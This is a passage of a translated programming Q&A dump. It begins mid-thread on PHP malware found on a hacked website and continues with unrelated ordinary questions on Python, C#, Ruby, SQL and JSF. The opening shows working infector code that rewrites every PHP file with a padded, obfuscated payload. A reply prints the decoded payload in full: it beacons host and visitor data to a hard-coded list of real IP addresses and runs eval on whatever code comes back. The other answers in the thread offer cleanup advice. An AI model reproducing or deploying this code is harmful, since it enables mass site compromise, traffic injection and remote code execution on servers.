    $md_start = md5($tmp);

    chmod($fname, 0666);
    $md = md5($fname);

    $pattern = '/function GetMama\(\).*\]\}\)\)\{break;\}\}/i';
    $replacement = '';
    $tmp = preg_replace($pattern, $replacement, $tmp);

    $pattern = '/\/\*god_mode_on.*god_mode_off\*\//i';
    $replacement = '';
    $tmp = preg_replace($pattern, $replacement, $tmp);

    $pattern = '/\/\*'.$md.'_on.*'.$md.'_off\*\//i';
    $replacement = '';
    $tmp = preg_replace($pattern, $replacement, $tmp);

    $pattern = '/<\?php[\s]*\?>/i';
    $replacement = '';
    $tmp = preg_replace($pattern, $replacement, $tmp);

    $pos = strpos($tmp, 'GetMama');
    $pos2 = strpos($tmp, 'god_mode_on');
    if (($pos === false) && ($pos2 === false)) {

        $code_t = 'if (!function_exists("GetMama")){  function mod_con($buf){str_ireplace("<body>","<body>",$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf); return $buf;}str_ireplace("</body>","</body>",$buf,$cnt_h);if ($cnt_h == 1) {$buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf); return $buf;}return $buf;}function opanki($buf){$gz_e = false;$h_l = headers_list();if (in_array("Content-Encoding: gzip", $h_l)) { $gz_e = true;}if ($gz_e){$tmpfname = tempnam("/tmp", "FOO");file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, "r");$contents = gzread($zd, 10000000);$contents = mod_con($contents);gzclose($zd);unlink($tmpfname);$contents = gzencode($contents);} else {$contents = mod_con($buf);}$len = strlen($contents);header("Content-Length: ".$len);return($contents);} function GetMama(){$mother = "###";return $mother;}ob_start("opanki");function ahfudflfzdhfhs($pa){$mama = GetMama();$file = urlencode(__FILE__);if (isset($_SERVER["HTTP_HOST"])){$host = $_SERVER["HTTP_HOST"];} else {$host = "";}if (isset($_SERVER["REMOTE_ADDR"])){$ip = $_SERVER["REMOTE_ADDR"];} else {$ip = "";}if (isset($_SERVER["HTTP_REFERER"])){$ref = urlencode($_SERVER["HTTP_REFERER"]);} else {$ref = "";}if (isset($_SERVER["HTTP_USER_AGENT"])){$ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));} else {$ua = "";}if (isset($_SERVER["QUERY_STRING"])){$qs = urlencode($_SERVER["QUERY_STRING"]);} else {$qs = "";}$url_0 = "http://" . $pa;$url_1 = "/jedi.php?version=0991&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;$try = true;if( function_exists("curl_init") ){$ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3);$ult = trim(curl_exec($ch));$try = false;} if ((ini_get("allow_url_fopen")) && $try) {$ult = trim(@file_get_contents($url_0 . $url_1));$try = false;}if($try){$fp = fsockopen($pa, 80, $errno, $errstr, 30);if ($fp) {$out = "GET $url_1 HTTP/1.0\r\n";$out .= "Host: $pa\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);$ret = "";while (!feof($fp)) {$ret  .=  fgets($fp, 128);}fclose($fp);$ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));}}  if (strpos($ult,"eval") !== false){$z = stripslashes(str_replace("eval","",$ult)); eval($z); exit();}if (strpos($ult,"ebna") !== false){$_SERVER["good"] = str_replace("ebna","",$ult);return true;}else {return false;}}$father2[] = "78.46.173.14";$father2[] = "176.9.218.191";$father2[] = "91.228.154.254";$father2[] = "77.81.241.253";$father2[] = "184.82.117.110";$father2[] = "46.4.202.93";$father2[] = "46.249.58.135";$father2[] = "176.9.241.150";$father2[] = "46.37.169.56";$father2[] = "46.30.41.99";$father2[] = "94.242.255.35";$father2[] = "178.162.129.223";$father2[] = "78.47.184.33";$father2[] = "31.184.234.96";shuffle($father2);foreach($father2 as $ur){if ( ahfudflfzdhfhs($ur) ) { break ;}}}';
        $mama = 'wtf';
        $mama = $_SERVER["HTTP_HOST"];
        $code_t = str_replace('###', $mama, $code_t);
        $code = '<'.'?php ';

        $prob = rand(5, 500);

        for ($i = 0; $i < 700 + $prob; $i++) {
            $code = $code.' ';
        }

        $code_t = Codee($code_t);

        $code = $code.'/*'.$md.'_on*/ '.$code_t.' /*'.$md.'_off*/'.' ?>'.$tmp;

        $f = fopen($fname, "w");
        fputs($f, $code);
        fclose($f);
    }
    chmod($fname, 0644);

}

function dir_num($dir) {
    global $fileslist;
    static $deep = 0;

    $odir = @opendir($dir);

    while (($file = @readdir($odir)) !== FALSE) {
        if ($file == '.' || $file == '..') {
            continue;
        } else {
            echo '. ';
            if (
            get_file_extension($file) == 'php') {
                modify($dir.DIRECTORY_SEPARATOR.$file);
            }
        }

        if (is_dir($dir.DIRECTORY_SEPARATOR.$file)) {
            $deep++;
            dir_num($dir.DIRECTORY_SEPARATOR.$file);
            $deep--;
        }
    }@closedir($odir);
}

Echo 'Wait please...<br>';

$dir = dirname(__FILE__);
dir_num($dir);

echo '<script>window.location.reload();</script>';
exit(); 
```

在这一部分中，脚本尝试`php`在当前目录和子目录中查找其他文件并感染它们。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-09T19:08:24.960

我想说删除所有类似的片段，更改所有密码，如果可能的话，让您的网站离线，直到支持可以回复您。它确实看起来不太好，在对代码和解码进行了一些挖掘之后，我发现了这个：

```
<?php 

if (!function_exists("GetMama")){
    function mod_con($buf){
        str_ireplace("<body>","<body>",$buf,$cnt_h);if ($cnt_h == 1) {
            $buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf); return $buf;
        }str_ireplace("</body>","</body>",$buf,$cnt_h);if ($cnt_h == 1) {
            $buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf); return $buf;
        }return $buf;
    }function opanki($buf){
        $gz_e = false;$h_l = headers_list();if (in_array("Content-Encoding: gzip", $h_l)) {
            $gz_e = true;
        }if ($gz_e){
            $tmpfname = tempnam("/tmp", "FOO");file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, "r");$contents = gzread($zd, 10000000);$contents = mod_con($contents);gzclose($zd);unlink($tmpfname);$contents = gzencode($contents);
        } else {$contents = mod_con($buf);
        }$len = strlen($contents);header("Content-Length: ".$len);return($contents);
    } function GetMama(){
        $mother = "www.99bits.com";return $mother;
    }ob_start("opanki");function ahfudflfzdhfhs($pa){
        $mama = GetMama();$file = urlencode(__FILE__);if (isset($_SERVER["HTTP_HOST"])){
            $host = $_SERVER["HTTP_HOST"];
        } else {$host = "";
        }if (isset($_SERVER["REMOTE_ADDR"])){
            $ip = $_SERVER["REMOTE_ADDR"];
        } else {$ip = "";
        }if (isset($_SERVER["HTTP_REFERER"])){
            $ref = urlencode($_SERVER["HTTP_REFERER"]);
        } else {$ref = "";
        }if (isset($_SERVER["HTTP_USER_AGENT"])){
            $ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));
        } else {$ua = "";
        }if (isset($_SERVER["QUERY_STRING"])){
            $qs = urlencode($_SERVER["QUERY_STRING"]);
        } else {$qs = "";
        }$url_0 = "http://" . $pa;$url_1 = "/jedi.php?version=0991&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;$try = true;if( function_exists("curl_init") ){
            $ch = curl_init($url_0 . $url_1);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_TIMEOUT, 3);$ult = trim(curl_exec($ch));$try = false;
        } if ((ini_get("allow_url_fopen")) && $try) {
            $ult = trim(@file_get_contents($url_0 . $url_1));$try = false;
        }if($try){
            $fp = fsockopen($pa, 80, $errno, $errstr, 30);if ($fp) {
                $out = "GET $url_1 HTTP/1.0\r\n";$out .= "Host: $pa\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);$ret = "";while (!feof($fp)) {
                    $ret  .=  fgets($fp, 128);
                }fclose($fp);$ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));
            }
        }  if (strpos($ult,"eval") !== false){
            $z = stripslashes(str_replace("eval","",$ult)); eval($z); exit();
        }if (strpos($ult,"ebna") !== false){
            $_SERVER["good"] = str_replace("ebna","",$ult);return true;
        }else {return false;
        }
    }$father2[] = "78.46.173.14";$father2[] = "176.9.218.191";$father2[] = "91.228.154.254";$father2[] = "77.81.241.253";$father2[] = "184.82.117.110";$father2[] = "46.4.202.93";$father2[] = "46.249.58.135";$father2[] = "176.9.241.150";$father2[] = "46.37.169.56";$father2[] = "46.30.41.99";$father2[] = "94.242.255.35";$father2[] = "178.162.129.223";$father2[] = "78.47.184.33";$father2[] = "31.184.234.96";shuffle($father2);foreach($father2 as $ur){
        if ( ahfudflfzdhfhs($ur) ) {
            break ;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:45:47.327

来自安全背景，我很确定您的网络服务器已被黑客入侵。首先，调查源头通常是一个好主意，以防止再次发生该错误。

首先：

*   查找通过时间戳感染的第一个文件。
*   记录活动的运行脚本以确定导致此问题的原因或 PHP 日志中的错误等。

如果您使用的是共享主机，那么您无能为力，共享主机用户通常更容易被破解，但如果您使用的是 VPS 或更好的主机，您可以联系您的主机以防托管主机完整的格式或必要的安全性固定。

然而，问题是删除这些片段在 99.99% 的情况下是没有用的，它不会阻止未来的破解。更改密码会有所帮助，但这又不是一个可靠的解决方案。

如果您有资源，请聘请安全专家进行快速审核。许多人只有在发现弱点时才要求付款。如果没有，请重新评估服务器中的潜在弱点。有关 Linux 服务器，请参阅这个 (http://www.thegeekstuff.com/2011/03/apache-hardening) 如果您使用的是 Windows，请告诉我，我也会将您链接到一些 Windows IIS。

很高兴我能帮上忙！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:08:15.820

它似乎是一个注入到您的站点的 php 类型的 shell 脚本。这可能是网络托管公司或您的个人网络应用程序允许黑客攻击发生的漏洞。

# python - 如何在父目录中导入python文件

> ID：10078287
> 
> 赞同：3
> 
> 时间：2012-04-09T19:02:35.567
> 
> 标签：python

如果我有以下目录结构：

```
parent/
    - __init__.py
    - file1.py
    - child/
        - __init__.py
        - file2.py 
```

在文件 2 中，我将如何导入文件 1？

**更新**：

```
>>> import sys
>>> sys.path.append(sys.path.append('/'.join(os.getcwd().split('/')[:-2])))
>>> import parent
>>> ImportError: No module named parent 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T19:15:47.223

您需要指定父级，并且它需要位于 sys.path

```
import sys
sys.path.append(path_to_parent)
import parent.file1 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-09T19:04:20.147

您仍然需要提及父级，因为它们位于不同的命名空间中：

```
import parent.file1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:45:47.223

Python Docs 上有一个关于模块的完整部分：

Python 2： [http ://docs.python.org/tutorial/modules.html](http://docs.python.org/tutorial/modules.html)

Python 3： [http ://docs.python.org/py3k/tutorial/modules.html](http://docs.python.org/py3k/tutorial/modules.html)

在两者中，请参阅第 6.4.2 节以了解父包的特定导入（以及其他包）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-16T00:02:43.220

这是我用来导入任何东西的东西。当然，您仍然必须将此脚本复制到本地目录，导入它以及`use`您想要的路径。

```
import sys
import os

# a function that can be used to import a python module from anywhere - even parent directories
def use(path):
    scriptDirectory = os.path.dirname(sys.argv[0])  # this is necessary to allow drag and drop (over the script) to work
    importPath = os.path.dirname(path)
    importModule = os.path.basename(path)
    sys.path.append(scriptDirectory+"\\"+importPath)        # Effing mess you have to go through to get python to import from a parent directory

    module = __import__(importModule)
    for attr in dir(module):
        if not attr.startswith('_'):
            __builtins__[attr] = getattr(module, attr) 
```

# c# - GridView：如何在每次更新行时将单元格的值增加一？

> ID：10078296
> 
> 赞同：0
> 
> 时间：2012-04-09T19:03:03.633
> 
> 标签：c#, asp.net, sql

我有一个简单的网格视图。SqlDataSource 将 tableData 绑定到 gridview。

在行更新时，我试图将单元格（类型 int ）的值增加一。这是我的代码，但不起作用：

```
protected void GridView1_RowUpdating(object sender, GridViewUpdateEventArgs e)
        {
            GridViewRow row = GridView1.Rows[e.RowIndex];
            string str = ((TextBox)(row.Cells[8].Controls[0])).Text;
            int conv = Convert.ToInt32(str);
            int set = conv + 1;
            string conn = "conn string";
            string sqlQuery = "UPDATE TableName SET Total =@Total";
            using (SqlConnection dataConnection = new SqlConnection(conn))
            {
                using (SqlCommand dataCommand = new SqlCommand(sqlQuery, dataConnection))
                {
                    dataCommand.Parameters.AddWithValue("Total", set);
                    dataConnection.Open();
                    dataCommand.ExecuteNonQuery();
                    dataConnection.Close();

                }
            }

        } 
```

我不知道为什么不起作用，我需要将当前编辑行的单元格增加一。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:07:13.067

根据您在此处提供的内容，您永远不会实际添加任何内容

```
int set = stra + 1;

dataCommand.Parameters.AddWithValue("Total", set); 
```

试试这个

```
int stra = stra + 1;

dataCommand.Parameters.AddWithValue("Total", stra); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:17:45.053

*   由于您没有提供密钥，因此您正在更新所有行，而不仅仅是已编辑的行
*   您应该使用[`e.NewValues`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewupdateeventargs.newvalues.aspx)来检索修改后的值

    ```
    string sqlQuery = "UPDATE TableName SET Total=@Total WHERE ID=@ID";
    using (SqlConnection dataConnection = new SqlConnection(conn))
    {
        using (SqlCommand dataCommand = new SqlCommand(sqlQuery, dataConnection))
        {
            var total = (int)e.NewValues["Total"] + 1;
            dataCommand.Parameters.AddWithValue("Total", total);
            dataCommand.Parameters.AddWithValue("ID", (int)e.Keys["ID"].Value);
            dataConnection.Open();
            dataCommand.ExecuteNonQuery();
        }
    } 
    ```

    *   [GridViewUpdateEventArgs.NewValues 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewupdateeventargs.newvalues.aspx)
    *   [GridViewUpdateEventArgs.Keys 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewupdateeventargs.keys.aspx)

# perl - LWP::UserAgent get(): `read_size_hint` 选项是否有默认大小

> ID：10078298
> 
> 赞同：0
> 
> 时间：2012-04-09T19:03:10.797
> 
> 标签：perl, size, lwp-useragent

当使用[LWP::UserAgent](http://search.cpan.org/perldoc?LWP%3a%3aUserAgent)中的`get`方法并设置但不设置时：是否会有一个恒定的默认值或块大小是否会改变？`:content_file``:content_cb``:read_size_hint`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T18:33:00.203

查看 LWP::Protocol::http（LWP::Protocol 版本 6.00）：默认块大小为 4096 字节。

# javascript - Moongoose：在另一个选择中查找名称

> ID：10078300
> 
> 赞同：0
> 
> 时间：2012-04-09T19:03:36.667
> 
> 标签：javascript, node.js, find, express, mongoose

我试图通过查找 id 来获取用户的名称。

```
query.find(function(err, dat) {
  for(i in dat) {
    users.findOne({_id: dat[i].owner}, function(userErr, user) {
      dat[i].ownerName = user.name;
      if(parseInt(i)+1==dat.length) res.render('view', {local: dat});
    });
  }
}); 
```

希望大家理解。我试图从查询中的另一个选择中获取名称。但问题是，我无法在用户查询回调之外保存变量。我该如何以正确的方式做到这一点？:-)

在上面的示例中，我只得到查询中的最后一个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:48:20.870

如果您想从内部（第二个？）找到的文档在某种程度上与第一个查询的文档相关，我建议您在架构或模型中定义一个类似 DBRef 的关系，并使用[mongoose 文档](http://mongoosejs.com/docs/populate.html)`populate()`中显示的那样

**快速示例：**

假设您想查找所有`Posts`关于咖啡因的话题，其作者是当前登录的`user`. 首先，定义你的模型：

```
var mongoose = require('mongoose')
  , Schema = mongoose.Schema

var UserSchema = new Schema({
    name    : String
  , email   : Number
  , posts   : [{ type: Schema.ObjectId, ref: 'Post' }]
});

var PostSchema = new Schema({
    _author : { type: Schema.ObjectId, ref: 'User' }
  , title    : String
  , body     : String
});

var Post = mongoose.model('Post', PostSchema);
var User = mongoose.model('User', UserSchema); 
```

.. 那么你就可以：

```
Post.find({title: /caffeine/i}).populate('_author', null, {name: user.name}).run(function (err, posts) {
 res.render('view', {local: posts})
}); 
```

# android - 谷歌地图不会显示在所有手机上。

> ID：10078302
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:03:51.500
> 
> 标签：android, google-maps, google-maps-api-3, google-api, android-maps

我目前正在与其他朋友一起开发一个使用地图的小型 android 项目。

起初我们都可以查看地图。然后我们使用 Google 的地图密钥将它导出到一个 APK，并且我们安装它的所有手机都可以使用。但是现在我们的 SVN 出现了一些问题，当我们通过调试安装它时，我们的四部手机中只有一部现在可以看到地图。

我们如何才能将其更改回旧方式，以便所有四部手机都能再次看到地图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:14:15.557

您是否有可能在不同的机器上构建应用程序，但所有机器的映射 api 密钥都相同（即不同机器上的调试密钥不同，但映射密钥相同）？

# ruby - Ruby 意外 kEND，期待 $end

> ID：10078316
> 
> 赞同：1
> 
> 时间：2012-04-09T19:04:47.357
> 
> 标签：ruby

```
require 'open-uri'
print "Enter a URL"
add = gets
open(#{add}) do |f|
  j = f.read.scan(/<img/)
  jlen = j.length
  puts jlen
end 
```

是我有的代码。出于某种原因，红宝石给了我错误：`findimages.rb:8: syntax error, unexpected kEND, expecting $end` 这是为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:06:49.720

`#{}`仅适用于内插字符串。使用`open(add)`（或完全正确，但完全没有必要`open("#{add}")`）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T19:08:12.097

在这条线上：

```
open(#{add}) do |f| 
```

您正在尝试使用`#{}`将变量插入字符串，但在字符串之外。被解释为注释的`#`开头，而该行的其余部分被视为注释。

您可以`add`直接在此处使用，无需任何字符串插值。

# xml - SQL Server 2008 搜索和替换 xml 节点值

> ID：10078319
> 
> 赞同：2
> 
> 时间：2012-04-09T19:05:19.813
> 
> 标签：xml, sql-server-2008, list, replace

我在一个表中有一个列，其中包含如下所示的 xml

```
<memberHours type="TeamHours[]"> 
<item> 
  <member type="String">Bill</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
<item> 
  <member type="String">John</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
<item> 
  <member type="String">Sally</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
</memberHours> 
```

我需要能够找到成员等于“John”的所有行，然后将“John”替换为“Jon”。由于我的 xml 存储在 nvarchar(max) 列中，因此我正在编写一个函数，将该列转换为我可以使用的 xml 变量。我想不通的是如何找到匹配的“项目”以及如何只替换那个值（即只是“约翰”）

我在 SQL Server 2008 上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:34:41.413

看看下面的 MSDN 文章：

[替换（XML DML）的值](http://msdn.microsoft.com/en-us/library/ms190675%28v=sql.100%29.aspx)

具体来说，你可以尝试这样的事情：

```
-- Setup test data
declare @table table (
    col nvarchar(max) not null
)
insert into @table select
'<memberHours type="TeamHours[]"> 
<item> 
  <member type="String">Bill</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
<item> 
  <member type="String">John</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
<item> 
  <member type="String">Sally</member> 
  <hours type="Decimal">0.0</hours> 
</item> 
</memberHours>'

-- Set search/replace vars
declare @oldval nvarchar(max) = 'John'
declare @newval nvarchar(max) = 'Jon'
declare @oldcol xml
declare @newcol xml

-- Loop over records fitting the search
while exists (
    select null
    from (
        select cast(col as xml) as col
        from @table
    ) as a
    where col.exist('/memberHours/item/member[(text()[1]) eq sql:variable("@oldval")]') = 1
) begin

    -- Grab a record as xml
    set @oldcol = (
        select top 1 col
        from (
            select cast(col as xml) as col
            from @table
        ) as a
        where col.exist('/memberHours/item/member[(text()[1]) eq sql:variable("@oldval")]') = 1
    )
    set @newcol = @oldcol

    -- Modify xml data
    while @newcol.exist('/memberHours/item/member[(text()[1]) eq sql:variable("@oldval")]') = 1 begin
        set @newcol.modify('
            replace value of (/memberHours/item[member=sql:variable("@oldval")]/member/text())[1] with sql:variable("@newval")
        ')
    end

    -- Update table
    update @table
    set col = cast(@newcol as nvarchar(max))
    where cast(cast(col as xml) as nvarchar(max)) = cast(@oldcol as nvarchar(max)) -- Cast both for equality test!

end

-- Test output
select * from @table 
```

# ruby-on-rails-3 - IndexTank 自动完成功能无法在 Rails 3 中使用 Tanker gem

> ID：10078323
> 
> 赞同：1
> 
> 时间：2012-04-09T19:05:52.323
> 
> 标签：ruby-on-rails-3, autocomplete, indextank

我无法让 Indextank 的自动完成功能在我的 Rails 应用程序中工作。我正在使用 searchify 来托管我的索引和 Tanker gem 来创建我的索引 (https://github.com/kidpollo/tanker)。我已按照此处（http://www.searchify.com/documentation/tutorial-autocomplete）和此处（https://github.com/flaptor/indextank-jquery/）的指南进行操作，但我没有得到任何结果背部。我在 searchify 仪表板中启用了公共 API。

我认为问题与 Tanker gem 索引数据的方式有关（它可以在一个索引中索引多个模型）。这里报告了同样的问题 - [https://github.com/kidpollo/tanker/issues/25](https://github.com/kidpollo/tanker/issues/25) - 但我对给出的解决方案感到困惑。我不确定 :indexes => :text 在这种情况下是什么意思。任何人都可以更清楚地了解我需要做什么吗？

这是我索引数据的模型。尚无其他模型索引数据

```
class Post < ActiveRecord::Base
  include Tanker

  # Relationships
  belongs_to :user
  has_many :comments

  tankit index do
    indexes :title
    indexes :description
    indexes :post_comments do
      comments.map {|comment| comment.description }
    end
  end

  # define the callbacks to update or delete the index upon saving and deleting records
  after_save :update_tank_indexes
  after_destroy :delete_tank_indexes
end 
```

这是我用来测试自动完成的代码。我也尝试使用[https://github.com/flaptor/indextank-jquery/中的示例](https://github.com/flaptor/indextank-jquery/)

```
<script src='https://raw.github.com/flaptor/indextank-jquery/master/jquery.indextank.ize.js' type='text/javascript'></script>
<script src='https://raw.github.com/flaptor/indextank-jquery/master/jquery.indextank.autocomplete.js' type='text/javascript'></script>

<script type='text/javascript'> 
  var publicApiUrl = "myPublicURL";
  var indexName = "myIndexName";
</script> 

<script type='text/javascript'>
  $(document).ready(function(){
      // let the form be 'indextank-aware'
      $("#myform").indextank_Ize(publicApiUrl, indexName);
      // let the query box have autocomplete
      $("#query").indextank_Autocomplete();
  });
</script>

<%= form_tag 'posts/search', :method => :get, :id => 'myForm' do %>
  <%= text_field_tag :query, "", :id => 'query' %>
  <button type="submit">Search</button>
<% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:34:39.743

嗨，Chris，来自 Searchify。我对 Tanker gem 太熟悉了。但 Searchify/IndexTank 默认在名为“文本”的文档字段中搜索，包括自动完成建议。因此，请尝试在“文本”字段中索引您的数据（标题、描述或 post_comments，来自您的代码片段）。如果您仍有问题，请通过网站或我们的支持电子邮件与我联系，我可以查看您的索引以了解您（和油轮）如何索引事物。

# javascript - 管理 javascript 数据

> ID：10078324
> 
> 赞同：0
> 
> 时间：2012-04-09T19:06:04.830
> 
> 标签：javascript, jquery, ajax, performance

我有一个网站，在登录时获取用户数据。这个数据被mysql保存为一个字符串，在用ajax调用这个字符串后，我通过js函数拆分数据：str.split()。这将返回一个数组，其中包含我要检查的 btns 的所有 id，并通过“.each”调用检查所有匹配的 btns。最大的问题是这个过程在本地服务器上大约需要 10 秒。有没有更好更快的方法来获取用户数据？ps：我们在用户登录时谈论数百个btns。

这是代码：

```
function get_saved_list(){
    $.ajax({
        type: "post",
        url: "ajax/get_saved_list.php",
        success: function(data){
            list=data.split(";");
            for(j=0; j<list.length-1; j++){
                $(".content #"+list[j]).siblings('a').trigger('click');
            }
            setTimeout("$('#save').hide()", 1);
        }
    });     
} 
```

一些 html 包含触发的“a”：

```
<ul class="content"><li>
<a class="third_cat_chb cat_chb_off"></a><span>page</span>
                                        <button id="page_<?php echo $row['page']."Z"; ?>chapter_<?php echo $row['s_id'];?>" style="width: 20px; margin-right: 5px;" class="page_chooser"></button></li></ul> 
```

对不起格式不好:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T14:07:31.107

不要在你的 ID 选择器前面加上一个类。这会禁止 jQuery 使用原生的 getElementById()，而是使用速度较慢的 getElementsByClassName()。

试试这个选择器：`$("#"+list[j])`

我能够循环浏览 1000 个项目并在大约 1 秒内触发一次点击，而不是先上一堂课需要 4-5 秒。

如果您可以在`<a>`要单击的实际对象上放置一个 ID，这也将有所帮助，这样您就可以避免调用 Siblings()，这会增加额外的开销。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T14:15:36.697

如果您已经控制了服务器，则可以节省大量时间来使用`checked="true"`html 属性，在 php 中有条件地设置它而不是触发点击事件。

如果您坚持使用 Javascript：我不确定，但设置`checked`属性也可能比单击它更快，因为您不会同时触发“单击”事件。

```
$("#"+list[j]).siblings('a').attr('checked'); 
```

应该可以工作，虽然我没有测试过。

确实，如果可以的话，将其设置在服务器上是可行的方法。

# java - JSF：我的应用程序中未引用 javax.faces.resources

> ID：10078330
> 
> 赞同：1
> 
> 时间：2012-04-09T19:06:35.510
> 
> 标签：java, jsf, resources

`Resources`我的应用程序中未引用包含`js`和`css`文件的文件夹，这是我使用开发人员工具`javax.faces.resource`获得的前端错误日志`Chrome`

```
GET http://demo:2008/javax.faces.resource/themes/sam/theme.css.jsp?ln=icefaces.ace 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/util/ace-components.js.jsp?ln=icefaces.ace 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/yui/yui-min.js.jsp?ln=yui/3_1_1&v=3068887 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/util/combined.css.jsp?ln=icefaces.ace 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/loader/loader-min.js.jsp?ln=yui/3_1_1&v=3068887 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/util/ace-jquery.js.jsp?ln=icefaces.ace 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/yui2-skin-sam-button/assets/button-core.css.jsp?ln=yui/2in3 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/combined.js.jsp?ln=org.icefaces.component.util&v=3068887 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/yui2-skin-sam-tabview/assets/tabview-core.css.jsp?ln=yui/2in3 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/combined.css.jsp?ln=org.icefaces.component.util 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/fileEntry.js.jsp?ln=org.icefaces.component.fileentry&v=3068887 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/slider/assets/slider-core.css.jsp?ln=yui/3_1_1 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/bridge.js.jsp?v=3068887 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/icefaces-compat.js.jsp 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/compat.js.jsp 404 (Not Found)
JobImport.jsp:246GET http://demo:2008/javax.faces.resource/jsf.js.jsp?ln=javax.faces&v=3068887 404 (Not Found)
JobImport.jsp:249Uncaught ReferenceError: ice is not defined
(anonymous function)JobImport.jsp:249
JobImport.jsp:250Uncaught ReferenceError: ice is not defined
(anonymous function)JobImport.jsp:250
JobImport.jsp:253Uncaught ReferenceError: ice is not defined
JobImport.jsp:254Uncaught ReferenceError: ice is not defined 
```

是否有任何我们需要做的特定配置`javax.faces.resources`在我们的应用程序中被正确引用？

**更新：添加了 jsp、xhtml 和 web.xml 文件**

这是我的`jsp`页面

```
 <html>
<head>
    <!-- BEGIN SCRIPT TO OPEN RIGHT NOW HELP POPUP, THIS SCRIPT INCLUDES THE FUNCTION OPENRN-->
    <%@ include file="/js/popupRightNow.inc" %>

    <!-- END SCRIPT TO OPEN RIGHT NOW HELP POPUP, THIS SCRIPT INCLUDES THE FUNCTION OPENRN-->
    <title>Test</title>

    <META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
</head>
<body>
<jsp:include page="/navigation/TopNav.jsp" flush="true"/>

<jsp:include page="/entry/Upload.xhtml"/>

<!--BEGIN BOTTOM NAV -->
<jsp:include page="/navigation/BottomNav.jsp" flush="true"/>
<!--END BOTTOM NAV -->
</body>
</html> 
```

这是我的`xhtml`页面：

```
<?xml version='1.0' encoding='UTF-8' ?> 
```

```
<h:head>
    <title>ICEfaces 3</title>
    <!-- <link rel="stylesheet" type="text/css" href="/xmlhttp/css/rime/rime.css"/> -->
</h:head>
<h:body>
         <h:form id="form">
            <h:outputText value="Welcome to ICEfaces 3, select current date: "/>
            <ace:dateTimeEntry renderAsPopup="true">
                <f:convertDateTime pattern="MM/dd/yyyy" timeZone="Canada/Mountain"/>
            </ace:dateTimeEntry>
            <ace:fileEntry id = "fileUpload"
                           label="File Entry"
                           relativePath="uploaded"
                           fileEntryListener="#{fileUpload.uploadFile}"/>
         <h:commandButton value="Upload File" />
         </h:form>
</h:body> 
```

这是我的`web.xml`

```
 <?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app >
 <context-param>
    <param-name>javax.faces.FACELETS_SKIP_COMMENTS</param-name>
